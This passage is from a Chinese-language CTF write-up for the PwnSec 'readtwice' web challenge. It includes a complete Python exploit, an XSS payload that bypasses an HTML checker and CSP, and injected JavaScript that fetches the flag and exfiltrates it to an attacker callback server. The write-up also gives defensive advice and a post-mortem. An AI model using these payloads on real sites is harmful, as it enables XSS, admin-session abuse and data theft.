| 12 | 入口页 / 弹窗 / helper | 弹窗转 helper → `about:blank` → `history.back()` | 你自己的服务器日志 `entry visit #2` |
| 13 | 你自己的服务器 | 第二次访问返回 302 → 审查页 | 无 |
| 14 | 机器人主窗口 | 请求审查页（第二次，`Sec-Fetch-Site: none`） | `finalized = true`；八项全过（日志⑤） |
| 15 | 审查页 | 输出笔记原文（无 CSP） | `used = true` |
| 16 | 笔记原文 | `s.js` 顶层分支执行：`fetch('/api/flag')` → 外传 | 你自己的服务器日志收下 flag |

---

## 三、速查与参考

### 3.1 端点速查

| 端点 | 方法 | 作用 | 鉴权 |
|---|---|---|---|
| `/create` | POST | 创建笔记（过检查器） | 无 |
| `/report` | POST | 提交网址触发机器人审查 | 限速 3 次/分钟 |
| `/reports/session` | GET | 建立管理员会话 | 请求头 `X-Bot-Token` |
| `/reports/check` | GET | 审查页：第一次标记；第二次输出笔记原文 | 管理员会话 + 检查清单（2.5.2） |
| `/complete` | POST | 置 `approved = true` | 管理员会话 + `id` + `state` + `prepared` |
| `/review` | GET | 审批页面 | rid 匹配（**不检查管理员**） |
| `/sandbox` | GET | 在 iframe 中渲染笔记 | 管理员会话 + `prepared` |
| `/api/flag` | GET | 返回 flag | 管理员会话 + 存在本轮审查 |
| `/reports/arm/:id` | POST | 置 `prepared = true` | 请求头 `X-Bot-Token` |

### 3.2 审查状态字段

审查记录上有五个状态位，另有一个每轮随机的 `nonce`（它不是状态位）：

| 字段 | 初值 | 置位者 | 用途 |
|---|---|---|---|
| `visited` | false | 审查页第一次访问（机器人） | 决定审查页走哪个分支 |
| `prepared` | false | `/reports/arm/:id`（机器人） | 检查 5 |
| `approved` | false | `/complete`（审批页面被诱导调用） | 检查 6 |
| `finalized` | false | `watchDocument`（主窗口导航命中审查页时） | 检查 7 |
| `used` | false | 渲染成功时立即置位 | 检查 8，一次性消费 |
| `nonce` | 每轮随机 | 服务器生成，印在审批页面里 | `/complete` 的 `state` 对照 |

### 3.3 三个浏览器机制速查

| 机制 | 触发写法 | 效果 | 版本 |
|---|---|---|---|
| noscript 双模式 | `<noscript>` 内容 | JS 关：按标记解析；JS 开：按原始文本解析（提前在 `</noscript>` 处闭合） | 一直如此 |
| 声明式 Shadow DOM | `<template shadowrootmode=open>` | 内容进影子树；template 不进文档树；影子内容不计入子元素与文本 | Chrome 90 / 111 / 124 |
| DPU 部分更新 | `<?marker name=x>` + `<template for=x>` | 解析到 template 时把内容搬进 marker 位置；template 不进文档树 | Chrome 150 起支持；本题 152 实测可用 |

### 3.4 成功判据

本地复现时，看到下列内容即代表对应环节成功（完整日志解读见第四章）：

| 环节 | 判据 |
|---|---|
| 检查器通过 | `POST /create` 返回 302，Location 为 `/note/<编号>` |
| 脚本在沙箱执行 | 你自己的服务器收到 `/s.js` 请求（以及 2.6.4 验证时的 `/hit`） |
| 批准成功 | 服务端日志出现 `/REAL /complete admin=true ... match=true` |
| 第二次访问全过 | 服务端日志出现 `/CHECK ... sf=none/document ap=true fin=true prep=true` |
| 拿到 flag | 你自己的服务器打印 `FLAG = pwnsec{...}` |

---

## 四、完整链复现日志

以下是一次完整成功复现的原始输出（编号与 rid 为本次运行的取值）。为便于观察服务端内部状态，复现时在源码的几个关键路由开头加了一行日志（把当前状态写入容器内 `/tmp/proof.txt`；只做记录，不影响逻辑）。

### 4.1 攻击脚本与服务器输出

```text
[*] callback server on :8000
[*] /create → 302 Location=/note/f378f2bce2ecc059c395
[CB] entry visit #1 rid=f15f3f2e7f
[CB] helper hit → opener.history.back()
[CB] entry visit #2 rid=f15f3f2e7f
[CB] → 302 to /reports/check (traversal re-request = sf:none!)
[*] /report → 200

[FLAG] = pwnsec{real_flag_on_remote}
```

逐行对照：

| 行 | 含义 | 对应章节 |
|---|---|---|
| `[*] callback server on :8000` | 你自己的服务器启动（四个端点就绪） | 2.3 |
| `[*] /create → 302 Location=/note/f378f2...` | 笔记创建成功并通过检查器，编号为 `f378f2bce2ecc059c395` | 2.2 |
| `[CB] entry visit #1 rid=f15f3f2e7f` | 机器人第一次访问入口页（rid 由机器人追加） | 2.5、2.10 序 7 |
| `[CB] helper hit → opener.history.back()` | 弹窗被导航到 `/helper` 并触发主窗口历史回退 | 2.8 |
| `[CB] entry visit #2 rid=f15f3f2e7f` | 回退产生真实的第二次请求（`Sec-Fetch-Site: none` 在此请求上） | 2.8 |
| `[CB] → 302 to /reports/check ...` | 第二次访问返回 302，把导航送往审查页 | 2.8 |
| `[*] /report → 200` | `/report` 接口返回；此时整条链已执行完毕 | 无 |
| `[FLAG] = pwnsec{real_flag_on_remote}` | 你自己的服务器收到外传的 flag 并解码（本地占位值） | 2.9 |

### 4.2 服务端日志（容器内 `/tmp/proof.txt`）

```text
/CHECK rid=f15f3f2e admin=true visited=false sf=none/document ap=false fin=false prep=false used=false
/review rid=f15f3f2e7f235226807c8bb1 match=true admin=true
/sandbox rid=f15f3f2e7f235226807c8bb1 admin=true prepared=true
/REAL /complete admin=true id=f15f3f2e state=c72f07df prepared=true match=true
/CHECK rid=f15f3f2e admin=true visited=true sf=none/document ap=true fin=true prep=true used=false
```

逐行对照（`ap`=`approved`，`fin`=`finalized`，`prep`=`prepared`）：

| 行 | 含义 | 对应章节 |
|---|---|---|
| 第 1 行 `/CHECK ... visited=false ...` | 机器人访问审查页**第一次**：`visited` 尚为假；本次请求由 goto 发出，`sf=none/document` | 2.5.1 步骤 2 |
| 第 2 行 `/review ... match=true admin=true` | 审批页面被打开（弹窗顶层导航携带管理员 cookie） | 2.6.1 |
| 第 3 行 `/sandbox ... prepared=true` | 沙箱 iframe 加载笔记原文，`s.js` 在此执行 | 2.6.3 |
| 第 4 行 `/REAL /complete ... match=true` | 审批页面调用 `/complete` 成功（`admin`、`id`、`state`、`prepared` 全对） | 2.7 |
| 第 5 行 `/CHECK ... visited=true sf=none/document ap=true fin=true prep=true used=false` | 第二次访问：八项检查全过（`used=false` 是处理开始时的取值，通过后随即置真） | 2.8.3 |

第 5 行是整条链的收束点：`sf=none/document` 证明该请求由浏览器发起；`ap=true fin=true prep=true` 证明 `approved`、`finalized`、`prepared` 三项均已就位。该请求之后，审查页输出笔记原文，笔记中的脚本在顶层再次执行并把 flag 发往你自己的服务器。

### 4.3 观察提示

- 想看你自己服务器的逐请求日志，直接保留 4.1 的输出即可；`/s.js` 与 `/flag` 的请求也会到达此处（脚本 4.1 的精简打印未逐条显示它们）；
- 想看服务端五个状态位的演变，把 4.2 的两行 `/CHECK` 对照读即可；
- 每次运行编号与 rid 都会变化，属正常现象。

---

## 五、攻击脚本逐段讲解

完整攻击脚本如下（可在宿主机直接运行；它是本地复现版，官方原版从 `instance.json` 读取远程地址，复现时把两处地址改成本地映射）。脚本依赖 `requests` 库（`pip install requests`）。

```python
#!/usr/bin/env python3
import base64, json, threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlencode, urlsplit
import requests

TARGET   = "http://127.0.0.1:3001"                 # 目标（宿主机视角，映射到容器 3000）
CALLBACK = "http://host.docker.internal:8000"      # 你自己的服务器地址（容器视角访问宿主机）

result, visits = {}, {}                            # result：收到的 flag；visits：入口页访问计数
ready = threading.Event()

class Handler(BaseHTTPRequestHandler):
    # 所有入站请求的处理入口：按路径分发到四个端点（路由 1-4 见下）
    def do_GET(self):
        parsed = urlsplit(self.path)
        query = parse_qs(parsed.query)

        # 路由 1：入口页。第一次返回带攻击脚本的页面；第二次（历史回退）返回 302
        if parsed.path == "/" and "rid" in query:
            key = parsed.query
            visits[key] = visits.get(key, 0) + 1
            print(f"[CB] entry visit #{visits[key]} rid={query['rid'][0][:10]}", flush=True)
            if visits[key] > 1:
                print("[CB] → 302 to /reports/check", flush=True)
                self.send_response(302)
                self.send_header("Location",
                    f"http://localhost:3000/reports/check?rid={query['rid'][0]}")
                self.end_headers()
                return
            # 第一次访问的页面：开弹窗打开审批页面；收到端口后发送 "ready"，随后转入回退序列
            body = ("<!doctype html><script>"
                    "const q=new URLSearchParams(location.search),"
                    "i=q.get('rid'),w=open('http://localhost:3000/review?rid='+i);"
                    "onmessage=e=>{let p=e.ports[0];if(!p)return;p.postMessage('ready');"
                    "setTimeout(()=>{w.location='/helper';"
                    "setTimeout(()=>location='about:blank',250)},500)}</script>").encode()

        # 路由 2：辅助页面。与入口页同源，负责对主窗口执行历史回退
        elif parsed.path == "/helper":
            print("[CB] helper hit → opener.history.back()", flush=True)
            body = (b"<!doctype html><script>"
                    b"setTimeout(()=>opener.history.back(),500)</script>")

        # 路由 3：注入笔记的脚本。双分支：审查页顶层=读 flag 外传；沙箱内=转交端口
        elif parsed.path == "/s.js":
            body = ("let q=new URLSearchParams(location.search),i=q.get('rid'),C='" + CALLBACK + "';"
                    "if(location.pathname=='/reports/check')"
                    "fetch('/api/flag').then(x=>x.text()).then(x=>location=C+'/flag?x='+btoa(x));"
                    "else onmessage=e=>{if(e.ports[0])parent.opener.postMessage(0,'*',e.ports)};"
                    ).encode()

        # 路由 4：flag 接收端点。参数 x 是 base64 编码的 /api/flag 响应
        elif parsed.path == "/flag" and "x" in query:
            result["flag"] = json.loads(base64.b64decode(query["x"][0]))["flag"]
            ready.set()
            body = b"ok"
        else:
            body = b"ok"

        self.send_response(200)
        self.send_header("Content-Type",
            "application/javascript" if parsed.path == "/s.js" else "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")   # 入口页必须 no-store（2.8.2）
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_): pass

server = ThreadingHTTPServer(("0.0.0.0", 8000), Handler)
threading.Thread(target=server.serve_forever, daemon=True).start()   # 后台线程，主流程继续
print("[*] callback server on :8000", flush=True)

# 主流程：创建笔记 → 提交入口页地址 → 等待收到 flag
payload = ('<!doctype html><head><?marker name="c"></head><div>'
           '<template shadowrootmode=open><noscript>'
           '<a alt="</noscript></template><script src=' + CALLBACK + '/s.js></script>">x</a>'
           '</noscript></template></div>'
           '<template for=c><meta content="default-src \'none\'"'
           'http-equiv=content-security-policy></template>')
created = requests.post(TARGET + "/create",
                        data={"title": "t", "html": payload},
                        allow_redirects=False, timeout=15)
print(f"[*] /create → {created.status_code} Location={created.headers.get('Location','?')}")
created.raise_for_status()
note_id = created.headers["Location"].rsplit("/", 1)[-1]        # 从 302 的 Location 取编号

report_url = CALLBACK + "/?" + urlencode({"note": note_id})     # 提交入口页地址（带 note 参数）
response = requests.post(TARGET + "/report", data={"url": report_url}, timeout=25)
print(f"[*] /report → {response.status_code}")

if ready.wait(3) and "flag" in result:
    print("\n[FLAG] =", result["flag"])
else:
    print("[!!] no flag callback")
server.shutdown()
```

脚本各段与章节的对应关系：

| 脚本部分 | 作用 | 对应章节 |
|---|---|---|
| 路由 `/`（根路径） | 入口页：开弹窗、收端口发 `ready`、转入回退序列；第二次访问给 302 | 2.6、2.7、2.8 |
| 路由 `/helper` | 辅助页面；弹窗换到它上面后触发主窗口回退（`history.back()`） | 2.8.1 |
| 路由 `/s.js` | 注入笔记中的脚本（双分支） | 2.2、2.7、2.9 |
| 路由 `/flag` | 接收 base64 编码的 flag | 2.9 |
| `payload` 变量 | 2.2.1 的攻击笔记 HTML | 2.2 |
| `/create` 调用 | 创建笔记并取回编号 | 2.2 |
| `/report` 调用 | 提交入口页地址，触发机器人 | 2.4 |

> 与官方原版脚本的两处差异（复现适配）：目标地址从 `instance.json` 的 `main` 端点改为本地映射 `http://127.0.0.1:3001`；服务器地址从 `instance.json` 的 `callback` 端点改为 `http://host.docker.internal:8000`。逻辑与官方版本一致。

## 六、复现指南

### 6.1 环境要求

| 组件 | 要求 |
|---|---|
| Docker | 含 compose 插件 |
| Python | 3.8 及以上；安装 `requests`（`pip install requests`） |
| 端口 | 宿主机 `3001`（映射容器 `3000`）与 `8000`（你自己的服务器）可用 |
| 浏览器 | 无需本机浏览器；机器人自带（容器内 Chromium） |

### 6.2 步骤

```bash
# 1. 启动题目环境（首次构建约 1-2 分钟）
cd readtwice
docker compose up -d --build
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3001/    # 期望 200

# 2. 保存第五章脚本为 solve.py，运行（约 15 秒）
python3 solve.py
```

期望输出见 4.1：`/create` 302、两次 `entry visit`、302 重定向、最后 `FLAG = pwnsec{real_flag_on_remote}`。

### 6.3 观察与调试

| 想看什么 | 怎么做 |
|---|---|
| 你自己的服务器收到的每个请求 | 第五章脚本已打印主要事件；需要更细时在 `do_GET` 开头加一行打印 `self.path` |
| 服务端五个状态位 | 在 `/reports/check` 处理函数开头加 `appendFileSync("/tmp/proof.txt", ...)`（格式见 4.2），然后 `docker compose exec challenge cat /tmp/proof.txt` |
| 机器人是否访问了入口页 | 你自己的服务器日志的 `entry visit #1` |
| 回退是否产生真实请求 | 你自己的服务器日志出现 `entry visit #2`（没有出现说明入口响应缺少 `no-store` 或回退序列未执行） |
| 脚本是否在沙箱执行 | 2.6.4 的 `/hit` 验证法 |

### 6.4 常见问题

| 症状 | 原因 | 修法 |
|---|---|---|
| `/create` 返回 400 `Document profile rejected` | payload 与 2.2.1 不完全一致（常见：单引号、无引号属性、`</template>` 数量被改动） | 逐字节对照 2.2.1 的 payload |
| 笔记创建成功但整条链无反应 | 容器内 Chromium 过旧，不支持 DPU / 声明式 Shadow DOM | 使用题目原版镜像（Chromium 152 实测可用） |
| `/report` 返回 429 | 限速：同一分钟提交超过 3 次 | 等一分钟再试 |
| 只看到 `entry visit #1`，没有 `#2` | 弹窗被拦截或 helper 未执行 | 确认环境为无头模式（本题目机器人就是无头）；检查 `/helper` 路由是否可达 |
| 第二次访问返回 403 | 八项检查某项未过 | 对照 4.2 日志逐项看 `sf`、`ap`、`fin`、`prep` 哪个为假 |
| 收到 flag 但内容不对 | 本地 flag 就是占位值，属正常 | 改 `docker-compose.yml` 里的 `FLAG` 再试 |

---

## 七、防御建议

按攻击链的每个环节给出防御手段（防御顺序从"能否让这一环不存在"到"如何补救"）：

| # | 被利用的点 | 攻击原理 | 防御措施 |
|---|---|---|---|
| 1 | 检查器与渲染环境不一致 | 同一份输入在 JS 关闭与 JS 开启下解析结果不同 | 检查与执行使用同一环境；**更根本的做法：不存储、不渲染用户 HTML**（或改用白名单渲染器如 DOMPurify 并保持更新，且把 `template[shadowrootmode]`、`<?…>` 处理指令、`noscript` 等纳入拒绝清单） |
| 2 | CSP meta 的生效时机 | 笔记内的 meta 在文档末尾才被 DPU 搬入 head，脚本在它生效之前执行 | 保护性页面**只使用响应头 CSP**（从第一个字节就生效，没有时序窗口），不依赖文档内 meta |
| 3 | 审批逻辑信任"端口消息" | 消息端口可以跨源转交，审批页面无法验证 `ready` 的真实发送者 | 端口消息增加与发送者绑定的挑战值（且挑战值不出现在沙箱可读的通道）；或把"批准"改为服务端签发的一次性令牌 |
| 4 | `Sec-Fetch-Site: none` 被当作可信来源 | 历史回退等浏览器发起导航同样产生 `none` | 敏感操作叠加一次性 CSRF 令牌（写入首访响应、消费时校验），不把 Fetch Metadata 当唯一防线 |
| 5 | 审查状态可被逐项拼齐 | `approved`、`finalized` 可在窗口期内由不同来源分别置位 | 状态置位与消费之间加入会话级随机数绑定与短时效；消费成功后其余状态一并失效 |
| 6 | `/review` 不校验管理员 | 知道 rid 即可打开审批页面并读到 `state` | `/review` 同样要求管理员会话；`rid` 与 `state` 不同时出现在低权限可读的响应里 |
| 7 | rid 泄漏给提交的网址 | 机器人把 `rid` 追加到攻击者控制的网址上 | 内部编号与外部回执分离；或只允许提交同源网址 |

> 一句话总结防御要点：**"检查环境必须等于执行环境；响应用的保护必须来自响应头；让页面替服务器做安全决策时必须先解决'如何证明消息真是它发的'"**。

---

## 八、比赛过程复盘与改进方案

本章记录比赛期间的实际分析过程：做过哪些工作、在哪些判断上出错、以及对应的改进措施。记录的目的是形成可复查的经验，而不是叙述过程。

### 8.1 比赛期间完成的工作（事实清单）

| 工作 | 结果 |
|---|---|
| 搭建本地复现环境（Docker + 容器内 Chromium 152） | 完成，与远程同版本 |
| 审计全部端点与状态机（`server.js`、`bot.js`、`review.ejs`） | 完成，八项检查、五个状态位、机器人五步流程均核实 |
| 对检查器做模糊测试（结构性 12600 例 + 随机变异 3000 例 + 进化变异 3600 例，共 19200 例） | 全部失败；检查通过者的 DOM 与渲染结果零差异 |
| 对 `Sec-Fetch-Site` 做完整实测矩阵（goto/重定向/脚本跳转/弹窗/表单/Refresh/reload/noopener/noreferrer/透明源等） | 完成；确认除浏览器发起的导航外均得不到 `none` |
| 验证笔记在 `/sandbox` 中无法执行脚本（注入实测被 meta CSP 拦截） | 完成；据此得出"官方审批流程对合法笔记不可能触发"的结论 |
| 发现并实现一条旁路链（同站端口 cookie 传输），本地连续 3 次成功 | 完成；因远程条件不满足而无法用于远程（见 8.3） |
| 模拟远程拓扑（你自己的服务器移出容器）并实测差异 | 完成；确认唯一缺口是"批准"一环 |

比赛结束时状态：八项检查均已在本地通过（`approved` 依赖旁路链，见 8.3），但旁路链在远程不成立，未拿到远程 flag。

### 8.2 三个卡点

**卡点一：检查器绕过（未找到声明式 Shadow DOM 与 DPU 的组合）**

当时的判断：19200 例模糊测试全部失败，且逐项排查了 `noscript`、编码、截断、双 meta 等方向后，判定"检查器不可绕过"，并停止了该方向的搜索。

赛后对照（2.2.1 的 payload）：绕过依赖三个机制：`noscript` 双模式（一直存在）、声明式 Shadow DOM（2021/2023 年特性，MDN 有公开文档）、DPU（2026 年 5 月公告、Chrome 150 起支持的新特性）。其中声明式 Shadow DOM 的知识是已有的，只是没有被"检查器在数什么"这一提问激活；DPU 属于 2026 年新进入 Chrome 支持的特性。

当时可执行而未做的动作：做一次机制向检索，例如"两个环境读取同一份输入，可能有哪些解析差异"、"Chromium 近一年新增了哪些解析行为"。这两个提问的第一个结果页就包含 MDN 的模板元素文档与 Chrome 官方博客的 DPU 公告。

**卡点二：历史回退的两次误判**

第一次误判来自简化的实验：用两个简单页面测试 `goBack()`，观察到浏览器直接用 BFCache 恢复页面、没有发出网络请求，将结论泛化为"历史回退不会重新发请求"。而真实攻击序列包含三个实验里没有的状态要素：页面曾打开弹窗、先导航到 `about:blank`、响应带 `no-store`。在这组状态下，回退产生了真实的网络请求（4.1 日志的 `entry visit #2`）。

第二次误判来自对二手信息的采信：检索到的 Firefox bug 报告（bug 1648825）中有一句对 Chrome 行为的描述（大意：Chrome 在历史回退场景下发送 `cross-site`）。当时据此为"回退不可行"增加了一条依据，而没有本地复测。该描述的适用场景与本题不同；本题环境实测回退请求带 `none`（4.2 日志第 5 行的 `sf=none/document`）。

当时可执行而未做的动作：按完整状态要素重做实验；用 10 分钟写一个最小页面（回退后打印收到的请求头）复测该断言。

**卡点三：错误结论导致的方向分配**

"检查器不可绕过"的结论一旦成立，攻击链就只剩"在不执行笔记脚本的前提下拼齐状态"这一条路，全部时间随之后期投入 `Sec-Fetch` 方向与旁路链。方向分配本身是结论的合理推论。问题在于**结论的确定性是被高估的**：模糊测试的覆盖范围是字典枚举的构造空间，它对字典外的构造（未激活的旧知识与新特性）天然不可见。否定结论没有附覆盖范围声明，也没有设重新检查的时点，于是被当作已确认事实使用。

### 8.3 比赛期间的旁路链及其适用范围

比赛期间实现的旁路链解决了除"检查器绕过"外的全部环节，值得如实记录（它是理解八项检查的完整练习，也是"批准"环节可行性的独立验证）：

原理：**SameSite 的站点计算不包含端口**。`localhost:3000` 与 `localhost:4001` 属于同一站点，`SameSite=Lax` 的会话 cookie 会随发往同站点任意端口的请求发送。攻击者把服务器开在容器内 `localhost:4001` 时，机器人访问入口页的请求会带着管理员会话 cookie 到达：

```text
[ATK] GET /... | cookie=sid=s%3A...
```

配合两处信息泄漏（机器人把 `rid` 追加到提交的网址上，入口请求的 URL 里可见；`/review` 只校验 `rid` 不校验管理员，可以直接读出 `state`），攻击者就能用自己的服务器伪造一次 `/complete` 调用（带上窃取到的 `sid`），并让随后的 302 链通过全部检查。该链在本地连续 3 次成功。

适用范围：在远程环境里，你自己的服务器位于容器之外（跨站），cookie 不会发送（实测：入口请求的 Cookie 头为空）。因此该链只在"你自己的服务器与目标同站"时成立，不能用于真实远程环境。官方解法（2.6-2.9）不需要窃取会话：批准由审批页面完成、`none` 由历史回退产生，全部组件在远程条件下均成立。

### 8.4 失败原因的逐层定位

把 8.2 的三个卡点继续下挖，可归到四条原因与相应的结构缺口：

| # | 直接原因 | 结构缺口 |
|---|---|---|
| 1 | 把模糊测试的否定结果升级为"不可绕过"的确定性，并停止该方向搜索 | 否定结论没有固定的覆盖范围声明格式；"不可绕过"类结论没有强制重新检查的机制 |
| 2 | 全程只做答案向检索（"这类题怎么解、有没有同类题"），从未做机制向检索（"这个现象存在哪些可能机制"） | 检索策略单一，没有"卡壳时切换检索类型"的规则 |
| 3 | 用简化场景做实验，将结论外推到含更多状态要素的真实场景 | 实验设计前没有"先列全状态要素、再逐项覆盖"的清单 |
| 4 | 采信外部资料对他方行为的转述，未做本地复测 | 对"将决定方向取舍的外部断言"，没有一手验证规则 |

把四条原因合成一条因果链：

远程拿 flag 需要两扇门同时打开：

- **门 A：检查器绕过**：让笔记既能通过检查、又能在渲染时执行脚本（noscript 双态 + 声明式 Shadow DOM + DPU 的组合）。它同时是"批准"（沙箱里脚本转交端口）和"读 flag"（顶层重渲染）的前提；
- **门 B：一次带 `Sec-Fetch-Site: none` 的浏览器发起导航**（回退 + 302 路线），用来过检查 4。

原因 1、2 关上了门 A；原因 3、4 关上了门 B。两扇门缺一不可：只有 A，检查 4 过不去；只有 B，脚本执行与批准都拿不到。比赛结束时两扇门都处于"被判定不可行"的状态，而唯一走通的本地旁路链（8.3）在远程不成立，远程 flag 因此拿不到。

补充说明三点：

- 第 1 条是影响最大的一条：它发生在最早期，直接关闭了通往正解的一条必经路径（检查器绕过），后面所有时间都在其余方向内分配；
- 第 2 条与第 1 条是同一个问题的两面：正因为不再怀疑"检查器不可绕过"，也就不会去问"可能存在哪些解析机制"，机制向检索的触发条件（结论存疑时）从未出现；
- 第 3、4 条相互独立，但作用在同一处：它们让"历史回退不可行"这个错误结论的确定性变得很难被推翻。

### 8.5 改进方案

针对 8.4 的结构缺口，列出五条具体措施。每条包含：措施（做什么）、载体（落在哪里）、验证方式（怎么确认它生效）。

| # | 措施 | 载体 | 验证方式 |
|---|---|---|---|
| 1 | 浏览器相关题目开工时，先检索目标浏览器近 12-18 个月的平台新特性（Chrome 开发者博客、Chromestatus） | 分析流程清单（开工检查项） | 检查开工记录里是否有"查新"步骤及结果 |
| 2 | 任何"不可行/不可绕过"类结论必须附覆盖范围声明（"本结论只覆盖〔已枚举的构造空间〕"），并设定强制重新检查的时点 | 分析笔记模板 | 抽查历史结论是否都带覆盖声明；到期结论是否被重新检查 |
| 3 | 检索双轨制：答案向（找同类解法）与机制向（问"存在哪些机制"）并行；卡壳超过数小时强制切换 | 分析流程清单 | 统计卡壳场景下是否执行了机制向检索 |
| 4 | 涉及浏览器状态组合的实验，先列出场景全部状态要素（弹窗、中间页、缓存头等）再设计实验；结论注明未覆盖的要素 | 实验记录模板 | 抽查实验记录是否含状态要素清单与未覆盖声明 |
| 5 | 对将决定方向取舍的外部断言（尤其是他方产品行为的转述），先做最小本地复测再采信 | 分析流程清单 | 抽查关键结论是否附本地复测记录 |

> 对本场比赛的回放（用第 1、2 条复盘）：如果开工第一条动作是"查新"，Chrome 博客 2026 年 5 月的 DPU 公告（含 `<?marker>` 示例）会直接进入视野；即便未命中，第 2 条也会在写"检查器不可绕过"时要求附上覆盖声明，使该结论无法被封存为最终答案，从而保留第 3 条触发机制向检索的机会。这三条措施叠加，本次卡点一有较大概率被提前发现。范围提醒：这一回放只覆盖门 A（检查器绕过）；门 B（回退路线）对应第 4、5 条，两扇门缺一不可。

### 8.6 边界说明

- 上述措施提高"找到答案"的概率，不构成保证。它们的作用是：让正确的检索动作被执行、让错误的确定性可被推翻、让结论带着适用范围流通；
- 知识截止是一项硬限制：如果题目依赖发布不足数月、尚未被广泛文档化的特性，任何流程都无法替代"先把信息取回来"这一步，只能靠第 1 条（查新）提前完成信息获取；
- 赛后可查证：本题在比赛期间共有 14 支队伍解出，所需信息（Chrome 官方博客、MDN、WHATWG 规范）全部公开可检索。因此失败不在"信息不可得"，而在取用信息的策略（8.4 的四条）。这也是复盘的价值所在：错误可定位、可修正、可复查。

---

## 附录

### 附 A：源码文件对照

| 文件 | 内容 | 相关章节 |
|---|---|---|
| `src/server.js` | 全部路由、会话配置、审查状态机 | 2.2、2.4、2.5.2、2.6.3 |
| `bot/bot.js` | 检查器 `inspectDocument`；机器人 `review`、`watchDocument` | 2.2、2.5 |
| `src/views/review.ejs` | 审批页面（iframe + MessageChannel 批准逻辑） | 2.6.2、2.7 |
| `docker-compose.yml` | 环境变量与端口映射 | 2.1 |

### 附 B：术语速查

| 术语 | 一句话说明 |
|---|---|
| CTF | Capture The Flag，网络安全夺旗赛 |
| flag | 比赛的最终目标字符串（本题格式 `pwnsec{...}`） |
| 机器人（bot） | 题目内置的自动化无头浏览器，持有管理员会话 |
| 挑战域 | 题目服务器自身的网域（容器内为 `http://localhost:3000`） |
| 检查器 | 创建笔记时的 DOM 检查函数 `inspectDocument` |
| 审查页 | 路由 `/reports/check`；第一次访问做标记，第二次输出笔记原文 |
| 审批页面 | 路由 `/review`；包含沙箱 iframe 与批准逻辑 |
| 沙箱页 | 路由 `/sandbox`；在 iframe 中渲染笔记（`sandbox allow-scripts`） |
| 入口页 | 攻击者提交给机器人的网址所指向的页面 |
| CSP | Content Security Policy，内容安全策略：限制页面可加载/执行的内容 |
| meta CSP | 写在 `<meta http-equiv>` 里的 CSP，解析到该标签时才生效 |
| XSS | Cross-Site Scripting，跨站脚本攻击：让攻击者脚本在目标站点页面上执行 |
| SameSite=Lax | cookie 属性：跨站请求不带 cookie，顶层导航例外 |
| 顶层导航 | 让整个窗口/标签页加载一个新文档的导航（区别于 iframe 内加载） |
| Fetch Metadata | 浏览器自动附加的 `Sec-Fetch-*` 请求头，标明请求的发起方式 |
| `Sec-Fetch-Site: none` | 请求由浏览器本身发起（书签、地址栏、历史回退/前进等），无页面来源 |
| 历史回退 | 浏览器后退/前进操作，属浏览器发起的导航 |
| BFCache | 浏览器把离开的页面整体缓存进内存的机制；回退时可能直接恢复而不发请求 |
| `about:blank` | 空白页；导航到它不产生网络请求 |
| `no-store` | `Cache-Control` 响应头取值之一：响应不得存入缓存 |
| 302 重定向 | 服务器指示浏览器改用新地址重新请求 |
| MessageChannel | 浏览器 API：创建一对互通的消息端口 |
| 消息端口转移 | `postMessage` 第三参数把端口所有权交给另一窗口（可跨源） |
| 声明式 Shadow DOM | 用 `<template shadowrootmode=...>` 创建影子树的写法 |
| 影子树 | 挂在元素上的独立 DOM 树；其节点不在该元素的普通子树中，不计入子元素计数与文本 |
| DPU | Declarative Partial Updates，声明式部分更新（2026-05 新特性） |
| 处理指令 | `<?marker ...>` 形式的节点；不是元素，不参与元素计数 |
| 解析阻塞 | 外部脚本加载/执行期间解析器暂停，后续内容延后解析 |
| rid | 本轮审查编号，作为 URL 参数；机器人自动追加到提交的网址上 |
| nonce / state | 服务器每轮随机生成的校验值；审批页面把它作为 `state` 提交给 `/complete` |
| visited / prepared / approved / finalized / used | 审查记录的五个状态位（含义见 3.2） |

### 附 C：本地环境版本

| 组件 | 版本/说明 |
|---|---|
| 容器运行时 | `node:22-bookworm-slim` |
| 容器内浏览器 | Chromium 152（题目镜像自带） |
| 宿主机运行环境 | Python 3.8+ 与 `requests` |
| 端口映射 | 宿主机 `3001` → 容器 `3000`；你自己的服务器 `8000` |

### 附 D：资料与出处

- 官方题解仓库（本题解法来源，本文复现所依据的脚本即改编自此）：`https://github.com/stack1245/PwnSec-CTF-2026`（`web/readtwice/`）
- DPU 官方公告（2026-05-19）：`https://developer.chrome.com/blog/declarative-partial-updates`
- 声明式 Shadow DOM（web.dev）：`https://web.dev/articles/declarative-shadow-dom`
- `<template>` 元素文档（MDN，含 `shadowrootmode` 解析语义）：`https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/template`
- DPU 提案仓库（WICG）：`https://github.com/WICG/declarative-partial-updates`
- 历史回退与 Fetch Metadata 的相关讨论（Firefox bug 1648825）：`https://bugzilla.mozilla.org/show_bug.cgi?id=1648825`

（完）
